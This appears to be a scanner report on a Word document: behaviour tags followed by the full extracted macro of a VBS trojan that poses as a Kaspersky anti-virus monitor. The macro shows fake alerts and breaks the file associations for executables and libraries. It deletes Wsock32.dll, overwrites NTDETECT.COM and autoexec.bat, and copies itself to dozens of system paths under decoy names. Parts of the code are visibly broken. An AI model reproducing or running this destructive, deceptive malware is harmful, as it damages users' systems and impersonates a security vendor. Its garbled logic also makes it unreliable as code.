behavior.Shell: May run an executable file or a system command
behavior.System: May run an executable file or a system command on a Mac
behavior.Wscript.Shell: May run an executable file or a system command
behavior.autoexec: Runs when the Word document is opened

docinfo.macro:
' VBS.Trojan.AGM By JadraquerKiller
' I think that the heuristic of Norton AV sucks, because It don't detect many viruses...
' NAV is also bad, because use much memory, detect less viruses than others, If you submit a virus sample, Symantec reply with a cure in 7 days!!, Kaspersky Labs reply with a cure in less 24 hours!!!!!
MsgBox "Kaspersky Anti-Virus Monitor is starting, please wait..."
set agm = CreateObject("Scripting.FileSystemObject")
set a = agm.CreateTextFile("c:\windows\AvpM.exe.agm.vbs", true)
Set agm = CreateObject("Wscript.Shell")

agm.RegWrite "HKCR\.scr", "txtfile"
agm.RegWrite "HKCR\.bat", "txtfile"
agm.RegWrite "HKCR\.inf", "txtfile"
agm.RegWrite "HKCR\.sys", "txtfile"
agm.RegWrite "HKCR\.com", "txtfile"
agm.RegWrite "HKCR\.dll", "txtfile"
agm.RegWrite "HKCR\.html", "txtfile"
agm.RegWrite "HKCR\.ini", "txtfile"
agm.RegWrite "HKCR\.exe", "txtfile"
TextFile1.WriteLine "Kaspersky Anti-Virus Personal Pro has detected a suspicious object on your computer, Type_Script"
TextFile1.Close
Set agm = agm.GetFile("c:\Windows\System\Wsock32.dll") 
agm.Delete

agm.Close 
Set agm = agm.CreateTextFile("c:\NTDETECT.COM", True)

agm.WriteLine("ESTE ARCHIVO ES PURA MIERDA, VIVA CHILE MIERDA, KAV IS THE BEST")

               
agm.Close 

Set agm = agm.CreateTextFile("c:\autoexec.bat", True)
  
agm.WriteLine("ESTE ARCHIVO ES PURA MIERDA, VIVA CHILE MIERDA, KAV IS THE BEST")
 
                 
agm.Close 

set file = agm.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
Set c = agm.GetFile(WScript.ScriptFullName)
c.Copy("C:\windows\system\Navw32_sucks.exe")
c.Copy("C:\asd.exe")
c.Copy("C:\explorer.exe")
c.Copy("C:\McAfee_good_heuristic.exe")
c.Copy("C:\windows\system\peter_szor_is_sucker.html")
c.Copy("C:\windows\system\regedit.pif")
c.Copy("C:\windows\system\regedit.bat")
c.Copy("C:\windows\system\viva_chile_mierda.agm")
c.Copy("C:\windows\system\surface.exe")
c.Copy("C:\windows\system\susususu.agm")
c.Copy("C:\windows\system\surface.exe")
c.Copy("C:\windows\system\eugene_kaspersky_the_best.agm")
c.Copy("C:\windows\system\surface.exe")
c.Copy("C:\windows\system\Type_Script.heur")
c.Copy("C:\windows\system\Type_Win32.heur")
c.Copy("C:\windows\system\Type_Macro.heur")
c.Copy("C:\windows\system\Worm.P2P.gen")
c.Copy("C:\windows\system\Type_I-Worm.heur")
c.Copy("C:\windows\system\Type_BAT.heur")
c.Copy("C:\windows\system\New_Virus_mcafee_heur")
c.Copy("C:\windows\system\Bloodhound.Unknown_jajaja_heur_nav_sucks.sarc")
c.Copy("C:\windows\system\Type_Proof-of-concept-generic.2.agm")
c.Copy("C:\windows\fonts\Type_Unknown.agm")
c.Copy("C:\windows\system\Type_generic_unknown")
MsgBox "Kaspersky Anti-Virus Monitor Alert: File Navw32.exe suspicious Worm.P2P.gen"
MsgBox "Worm.P2P.gen is a generic detection for P2P based-virus (viruses that use Kazaa, Morpheus,etc). Please submit it file to newvirus@kaspersky.com"
MsgBox "Kaspersky Anti-Virus Monitor Alert: Your Master Boot Record (MBR) suspicious Type_MBR"
MsgBox "Kaspersky Anti-Virus Monitor Version: 4.5.0.48, Languaje: English"
MsgBox "Kaspersky Anti-Virus Monitor has succesfully remove the infected objects from your computer"



Set agm = agm.CreateTextFile("c:\AvpMreport.agm", True)

agm.WriteLine("Kaspersky Anti-Virus Monitor has repair all infected objects on it computer")

               
agm.Close 


Set agm = agm.CreateTextFile("c:\Windows\AvpM.exe.vbs", True)

agm.WriteLine("Kaspersky Anti-Virus Monitor is starting, please wait... Copyright Kaspersky Labs Int. 2000-2003")

               
agm.Close
